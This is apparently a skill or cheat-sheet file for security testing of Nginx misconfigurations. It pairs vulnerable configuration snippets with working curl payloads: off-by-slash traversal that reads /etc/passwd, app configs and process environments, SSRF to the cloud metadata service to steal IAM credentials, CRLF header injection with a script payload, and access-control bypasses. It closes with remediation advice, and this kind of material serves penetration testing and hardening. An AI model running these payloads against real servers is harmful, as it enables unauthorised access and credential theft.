---
name: nginx
description: Nginx misconfiguration detection and exploitation techniques
---

# Nginx Security

## Attack Surface

- Path traversal via misconfigured `alias` directive (off-by-slash)
- `proxy_pass` to internal services enabling SSRF
- Exposed status pages (`/nginx_status`, `/server-status`) leaking connection data
- Missing or incorrect `Host` header validation in virtual host routing
- HTTP request smuggling via inconsistent `proxy_pass` behavior
- Header injection through improperly sanitized `$uri` or `$request_uri`
- Misconfigured `add_header` directives not inherited in nested location blocks
- Open redirect via `$uri` in `return` or `rewrite` directives

## Detection Techniques

- Test off-by-slash: request `/static../etc/passwd` when `location /static` uses `alias`
- Probe common status endpoints: `/nginx_status`, `/status`, `/server-info`
- Send crafted `Host` headers to detect virtual host misrouting
- Test CRLF injection in URL: `/%0d%0aX-Injected:header`
- Identify backend through error pages, `Server` header, and response timing
- Check `X-Accel-Redirect` header support for internal file access
- Fuzz path segments for `location` block bypass: `/admin`, `/Admin`, `/admin/`
- Test `merge_slashes` behavior: `//admin///secret`

## Common Payloads

### Off-by-Slash Path Traversal
```nginx
# Vulnerable configuration (missing trailing slash on alias)
location /static {
    alias /var/www/static;
}
# /static../etc/passwd resolves to /var/www/etc/passwd
```

```bash
# Exploitation
curl https://target.com/static../etc/passwd
curl https://target.com/static../app/config/database.yml
curl https://target.com/static../proc/self/environ
```

### Proxy SSRF via proxy_pass
```nginx
# Vulnerable configuration
location /api/ {
    proxy_pass http://backend/;
}
# Attacker can route to internal services via path manipulation
```

```bash
# Access internal metadata service
curl "https://target.com/api/http://169.254.169.254/latest/meta-data/"

# Probe internal services
curl "https://target.com/api/@internal-host/admin"
curl "https://target.com/api/..%2F..%2Finternal-service/"
```

### CRLF Injection via $uri
```nginx
# Vulnerable configuration
location /redirect {
    return 302 https://target.com$uri;
}
```

```bash
# Inject headers
curl -I "https://target.com/redirect/%0d%0aSet-Cookie:%20admin=true"
curl -I "https://target.com/redirect/%0d%0a%0d%0a<script>alert(1)</script>"
```

### Location Block Bypass
```bash
# If /admin is restricted but case or trailing slash is not normalized
curl https://target.com/Admin
curl https://target.com/admin/
curl https://target.com/admin;.js
curl https://target.com//admin
curl https://target.com/admin%2F

# merge_slashes off exploitation
curl https://target.com////admin////secret
```

### Status Page Exposure
```bash
curl https://target.com/nginx_status
curl https://target.com/status
curl https://target.com/server-status
# Returns: Active connections, request rates, upstream health
```

## Bypass Techniques

- Use URL encoding to bypass location block matching: `/admin` vs `/%61dmin`
- Exploit `merge_slashes` default (on) by testing with slashes off
- Abuse `X-Accel-Redirect` for accessing files behind internal locations
- Use request method variations: `location` blocks may only restrict GET, not POST
- Send oversized headers to trigger different parsing behavior behind reverse proxy
- Exploit differences between Nginx URL normalization and backend URL parsing

## Exploit Chaining

- Off-by-slash + source code read: extract application secrets from config files
- Proxy SSRF + cloud metadata: steal IAM credentials via metadata service
- CRLF injection + XSS: inject `Set-Cookie` or `Content-Type` headers for session fixation
- Status page + reconnaissance: use connection counts and upstream info for further attacks
- Location bypass + admin panel: access restricted admin functionality

## Remediation

- Always use matching trailing slashes: `location /static/` with `alias /var/www/static/`
- Avoid using raw `$uri` in `return` or `rewrite`; use `$request_uri` carefully or fixed strings
- Restrict status pages with `allow`/`deny` directives to internal IPs only
- Set explicit `Host` header validation in virtual host configurations
- Use `proxy_set_header Host $host` and validate upstream routing
- Apply `add_header` directives at the `server` level or ensure inheritance in nested blocks
- Disable `merge_slashes` when path-based access control is critical
- Enable `proxy_hide_header` for sensitive upstream headers like `X-Powered-By`
